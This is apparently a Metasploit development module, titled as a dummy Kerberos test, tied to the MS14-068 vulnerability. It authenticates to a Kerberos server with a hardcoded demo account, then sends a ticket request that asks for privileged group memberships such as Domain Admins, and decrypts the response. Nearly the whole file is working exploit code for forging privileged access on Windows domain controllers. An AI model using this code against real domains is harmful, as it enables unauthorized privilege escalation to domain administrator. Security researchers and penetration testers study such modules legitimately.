##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit4 < Msf::Auxiliary

  #include Msf::Exploit::Remote::Kerberos::Client
include Msf::Kerberos::Microsoft::Client

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Dummy Kerberos testing module',
      'Description' => %q{
        Dummy Kerberos testing module
      },
      'Author' =>
        [
					'juan vazquez'
        ],
      'References' =>
        [
          ['MSB', 'MS14-068']
        ],
      'License' => MSF_LICENSE,
      'DisclosureDate' => 'Dec 25 2014'
    ))
  end

  def run

    opts = {
      cname: 'juan',
      sname: 'krbtgt/DEMO.LOCAL',
      realm: 'DEMO.LOCAL',
      key: OpenSSL::Digest.digest('MD4', Rex::Text.to_unicode('juan'))
    }

		connect(:rhost => datastore['RHOST'])
    print_status("Sending AS-REQ...")
		res = send_request_as(opts)
		print_status("#{res.inspect}")

    unless res.msg_type == 11
      print_error("invalid response :(")
      return
    end

    print_good("good answer!")
    print_status("Parsing AS-REP...")

    session_key = extract_session_key(res, opts[:key])
    pp session_key
    logon_time = extract_logon_time(res, opts[:key])

    print_status("logon time: #{logon_time}")
    ticket = res.ticket

    opts.merge!(
      logon_time: logon_time,
      session_key: session_key,
      ticket: ticket,
      group_ids: [513, 512, 520, 518, 519],
      domain_id: 'S-1-5-21-1755879683-3641577184-3486455962'
    )
    print_status("Sending TGS-REQ...")
    res = send_request_tgs(opts)

    unless res.msg_type == 13
      print_error("invalid response :(")
      return
    end

    print_good("Valid TGS-Response")

    pp res


    decrypt_res = res.enc_part.decrypt("AAAABBBBCCCCDDDD", 9)
    enc_kdc_res = Rex::Proto::Kerberos::Model::EncKdcResponse.decode(decrypt_res)

    print_good("Decrypted!")
    pp enc_kdc_res
  end
end

